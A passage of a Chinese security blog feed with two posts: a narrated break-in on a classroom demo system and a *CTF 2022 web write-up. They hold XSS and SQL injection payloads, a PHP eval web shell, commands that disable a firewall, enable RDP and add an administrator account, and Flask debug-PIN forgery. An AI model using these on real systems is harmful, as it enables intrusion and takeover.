        <content type="html"><![CDATA[<p>水文章，不过是真实事件</p><span id="more"></span><p><strong>注意：</strong>本文所完成操作均已在教师知晓的情况下进行，未对正常教学产生影响，请勿模仿。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某节动态WEB课，老师展示了一个Demo，内容是一个注册系统，注册完后展示有数据库全部已注册的信息（select *），既然是系统那肯定会有不安全的地方存在，老师也说开发过程中要注意种种云云，遂测试发现确实有漏洞，进而写了shell，然后拿到windows教师机权限。全部过程教师已知，以下信息已经过修改，并非真实信息，本文目的旨在技术交流，教师机每天都会进行重置还原，本文操作没有对电脑造成任何破坏，请不要对任何操作系统进行破坏或攻击。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>毕竟是教学Demo，盲猜一手没有任何过滤，果真如此。</p><p>注册需要如下信息：姓名，密码，性别，爱好，年龄</p><p>注册是<code>index.htm</code>，提交信息到<code>doInsert.php</code>，然后直接跳转到<code>doSelect.php</code>。名称很明显，<code>doSelect.php</code>进行了一个</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from table;</code></pre><p>提交到信息明显是进行了一次插入，猜测后端语句如下。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into table(Username,Passwd,Gender,Hobby,Age) values(&#39;$Username&#39;,&#39;$Passwd&#39;,&#39;$Gender&#39;,&#39;$Hobbys&#39;,&#39;$Age&#39;);</code></pre><p>抓了包看提交到数据，发现都是明文提交，没有任何加密。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>提交表单跳转后会直接显示在<code>doSelect.php</code>，先打一下xss。</p><p>提交POST包</p><pre class="language-http" data-language="http"><code class="language-http">Username=&lt;scRipt>alert(1)&lt;/scrIpT>&amp;Passwd=1&amp;Gender=男&amp;Hobbys=蹦极&amp;Age=20</code></pre><p>提交后发现页面没有反应，查看源码，发现username有长度限制</p><img src="/article/penetrationtest/image-20220526205826254.png" class="" title="image-20220526205826254" loading="lazy"><p>尝试后发现Hobbys处的多选项没有限制固定内容，于是尝试在Hobbys处打xss</p><pre class="language-http" data-language="http"><code class="language-http">Username=zhangsan&amp;Passwd=helloworld&amp;Gender=男&amp;Hobbys=&lt;scRipt>alert(1)&lt;/scrIpT>&amp;Age=24</code></pre><p>测试成功，成功弹窗了（虽然表格格式乱了）</p><img src="/article/penetrationtest/image-20220526210033391.png" class="" title="image-20220526210033391" loading="lazy"><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>尝试一下注入，猜测multi没开，所以没法堆叠注入，先闭合。</p><pre class="language-http" data-language="http"><code class="language-http">Username=lisi&amp;Passwd=helloworld&amp;Gender=男\&amp;Hobbys=,version(),'24');--#&amp;Age=24</code></pre><p>这样insert的语句就变成了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">table</span><span class="token punctuation">(</span>Username<span class="token punctuation">,</span>Passwd<span class="token punctuation">,</span>Gender<span class="token punctuation">,</span>Hobby<span class="token punctuation">,</span>Age<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'lisi'</span><span class="token punctuation">,</span><span class="token string">'helloworld'</span><span class="token punctuation">,</span><span class="token string">'$Gender\','</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'24'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--#','24');</span></code></pre><p>很完美，提交</p><img src="/article/penetrationtest/image-20220526210558793.png" class="" title="image-20220526210558793" loading="lazy"><p>再看一下用户</p><img src="/article/penetrationtest/image-20220526210617022.png" class="" title="image-20220526210617022" loading="lazy"><p>很好，明显就是phpstudy直接起的服务。</p><p>尝试了一下<code>load_file</code>，<code>into outfile</code>发现8太行，在insert语句里似乎没有执行，尝试hex出来也不行</p><h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>既然是phpstudy启动的服务，而且作为教学使用，查看一下会不会有其他有用的东西，果然发现了<code>phpinfo.php</code>，获取了其web路径为<code>D:/phpStudy/WWW</code>，看了下信息，似乎还有phpMyAdmin，访问一下<code>/phpMyAdmin</code>，果然存在。</p><img src="/article/penetrationtest/image-20220526211536947.png" class="" title="image-20220526211536947" loading="lazy"><p>直接猜解一下，登录成功。既然是root就不客气了，直接执行SQL语句在web目录写个码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @eval($_POST['admin']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'D:/phpStudy/WWW/phpinfo2.php'</span><span class="token punctuation">;</span></code></pre><p>蚁剑直接连接</p><img src="/article/penetrationtest/image-20220526212000294.png" class="" title="image-20220526212000294" loading="lazy"><p>H盘是老师的U盘，为了信息安全我没有访问，当前目录打开命令行</p><img src="/article/penetrationtest/image-20220526212151492.png" class="" title="image-20220526212151492" loading="lazy"><p>很好，直接就是admin。</p><h3 id="尝试远程桌面登录"><a href="#尝试远程桌面登录" class="headerlink" title="尝试远程桌面登录"></a>尝试远程桌面登录</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">NetSh Advfirewall set allprofiles state off </code></pre><h4 id="看看防火墙是否关闭"><a href="#看看防火墙是否关闭" class="headerlink" title="看看防火墙是否关闭"></a>看看防火墙是否关闭</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">Netsh Advfirewall show allprofiles</code></pre><h4 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h4><p>尝试设置3389不成功，遂转换为3390</p><pre class="language-cmd" data-language="cmd"><code class="language-cmd">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3390 &#x2F;f</code></pre><h4 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></pre><h4 id="检查一下端口是否开放"><a href="#检查一下端口是否开放" class="headerlink" title="检查一下端口是否开放"></a>检查一下端口是否开放</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">netstat -an|find &quot;3390&quot;</code></pre><img src="/article/penetrationtest/image-20220526212630944.png" class="" title="image-20220526212630944" loading="lazy"><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">net user admin1 adminadmin &#x2F;add</code></pre><img src="/article/penetrationtest/image-20220526212832087.png" class="" title="image-20220526212832087" loading="lazy"><h4 id="授权用户组"><a href="#授权用户组" class="headerlink" title="授权用户组"></a>授权用户组</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">net localgroup Administrators admin1 &#x2F;add</code></pre><img src="/article/penetrationtest/image-20220526213221439.png" class="" title="image-20220526213221439" loading="lazy"><h4 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h4><p>此处无图，直接在学生机登录的，在同一网段下</p><h4 id="修改多用户同时登录"><a href="#修改多用户同时登录" class="headerlink" title="修改多用户同时登录"></a>修改多用户同时登录</h4><p>登录后按照网上教程走，运行打开<code>gprdit.msc</code></p><p>然后进行如下设置</p><img src="/article/penetrationtest/image-20220526213407742.png" class="" title="image-20220526213407742" loading="lazy"><p>结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透路上的小小一步，没什么技术含量，毕竟是和机房有关，比较有趣。也只是一个引子，打开了这个大门，以后还会继续往下学习。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf2022</title>
      <link href="article/starctf2022/"/>
      <url>article/starctf2022/</url>
      
        <content type="html"><![CDATA[<p>感觉挺有趣的</p><span id="more"></span><h1 id="Web："><a href="#Web：" class="headerlink" title="Web："></a>Web：</h1><h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>上来先搜grafana历史漏洞，果然根据版本号可以找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798">CVE-2021-43798</a> 进行目录穿越读文件。下载现成的 <a href="https://dl.packetstormsecurity.net/2112-exploits/grafana830-traversal.txt">POC</a> 把插件排除一下可以查出默认的用户名密码。</p><img src="/article/starctf2022/(null)-20220421125600359.(null)" class="" title="img" loading="lazy"><p>通过目录穿越读文件，即可以直接找<code>/etc/grafana/grafana.ini</code>，里面<code>admin_password</code>明文密码</p><p>使用用户名密码登录上系统，可以发现在 Data Source 处有 MySQL 数据库。从 Explore 功能里构造 time 写语句即可查出 flag。</p><img src="/article/starctf2022/(null)-20220421125600439.(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(tablE_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.tablEs&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre><img src="/article/starctf2022/(null)-20220421125559937.(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(column_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.columns&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre><img src="/article/starctf2022/(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;flag, 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;fffffflllllllllaaaagggggg</code></pre><p>其实直接看历史就有<code>fffffflllllllllaaaagggggg</code>这个表的查询记录，直接select就行</p><hr><h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>打开题目正常逻辑流程走一遍，发现写的note会过段时间(1-3s)被修改为‘Hacked by fmyy’，过了几个小时询问出题人发现此不是题目所为，很破坏体验，在无意义的项目上折腾浪费了很长时间。</p><p>根据<code>/view</code>路由报错获取部分源码，看不到 sql 构造，知道开启了flask debug mode</p><pre class="language-Python" data-language="Python"><code class="language-Python">@login_requireddef view():    note_id &#x3D; request.args.get(&quot;note_id&quot;)    sql &#x3D; f&quot;select * from notes where note_id&#x3D;&#39;&#123;note_id&#125;&#39;&quot;    print(sql)    result &#x3D; db.session.execute(sql, params&#x3D;&#123;&quot;multi&quot;: True&#125;)    db.session.commit()    result &#x3D; result.fetchone()    data &#x3D; &#123;        &#39;title&#39;: result[4],        &#39;text&#39;: result[3],    &#125;    return render_template(&#39;note.html&#39;, data&#x3D;data)</code></pre><p>但是报错右侧有console小标，猜测一手：flask PIN码伪造，猜对了</p><p><code>/view</code>处参数<code>note_id</code>可以直接注入，有明文报错</p><img src="/article/starctf2022/(null)-20220421125600008.(null)" class="" title="img" loading="lazy"><p>根据爆的表发现其他选手都在爆machineid和cgroup，更加确定是flask PIN码伪造，读取了报错内容里flask生成PIN码的关键逻辑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>    <span class="token comment"># end up with the same value and generate out 9 digits</span>    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>    <span class="token comment"># we don't have a result yet.</span>    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>                <span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> num    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre><p>可以明白rv就是最后生成的PIN码，生成PIN需要几个关键变量，</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>即<code>username</code>,<code>modname</code>,<code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>,<code>getattr(mod, &quot;__file__&quot;, None)</code>,<code>str(uuid.getnode())</code>和<code>get_machine_id()</code></p><h3 id="username"><a href="#username" class="headerlink" title="username"></a>username</h3><p>根据报错可知，启动用户为<code>ctf</code>，即<code>username</code>为<code>ctf</code></p><h3 id="modname"><a href="#modname" class="headerlink" title="modname"></a>modname</h3><p>modname也是根据报错得知为<code>flask.app</code>，默认也是</p><h3 id="getattr-app-“name“-type-app-name"><a href="#getattr-app-“name“-type-app-name" class="headerlink" title="getattr(app, “name“, type(app).name)"></a>getattr(app, “<strong>name</strong>“, type(app).<strong>name</strong>)</h3><p><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>默认为Flask</p><h3 id="getattr-mod-“file“-None"><a href="#getattr-mod-“file“-None" class="headerlink" title="getattr(mod, “file“, None)"></a>getattr(mod, “<strong>file</strong>“, None)</h3><p><code>getattr(mod, &quot;__file__&quot;, None)</code>在报错界面可知为<code>/usr/local/lib/python3.8/site-packages/flask/app.py</code></p><h3 id="str-uuid-getnode"><a href="#str-uuid-getnode" class="headerlink" title="str(uuid.getnode())"></a>str(uuid.getnode())</h3><p>靶机此值每次重置都会变化</p><p><code>str(uuid.getnode())</code>即为靶机网卡MAC地址的十进制，利用堆叠注入，读入文件<code>-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;%23</code>(此处用load_file好像不可以)</p><p>然后用联合查询<code>0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)%23</code>从主页上读取信息</p><p>读取了<code>/sys/class/net/eth0/address</code>，用python <code>str(int(MAC.decode().replace(&quot;:&quot;, &quot;&quot;), 16))</code>处理为十进制</p><h3 id="get-machine-id"><a href="#get-machine-id" class="headerlink" title="get_machine_id()"></a>get_machine_id()</h3><p>靶机此值每次重置都会变化</p><p>最后就剩<code>get_machine_id()</code>，网上文章众说纷纭，因为flask更新过这边的生成逻辑，这里不举例了，读了<code>__init__.py</code>直接对着题目分析代码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> _machine_id    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _machine_id    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        linux <span class="token operator">=</span> <span class="token string">b""</span>        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> value<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> value                <span class="token keyword">break</span>        <span class="token comment"># Containers share the same machine id, add some cgroup</span>        <span class="token comment"># information. This is used outside containers too but should be</span>        <span class="token comment"># relatively stable across boots.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/cgroup"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                linux <span class="token operator">+=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">b"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">if</span> linux<span class="token punctuation">:</span>            <span class="token keyword">return</span> linux        <span class="token comment"># On OS X, use ioreg to get the computer's serial number.</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># subprocess may not be available, e.g. Google App Engine</span>            <span class="token comment"># https://github.com/pallets/werkzeug/issues/925</span>            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token string">"ioreg"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"IOPlatformExpertDevice"</span><span class="token punctuation">,</span> <span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE            <span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token comment"># On Windows, use winreg to get the machine guid.</span>        <span class="token keyword">if</span> sys<span class="token punctuation">.</span>platform <span class="token operator">==</span> <span class="token string">"win32"</span><span class="token punctuation">:</span>            <span class="token keyword">import</span> winreg            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> winreg<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>                    winreg<span class="token 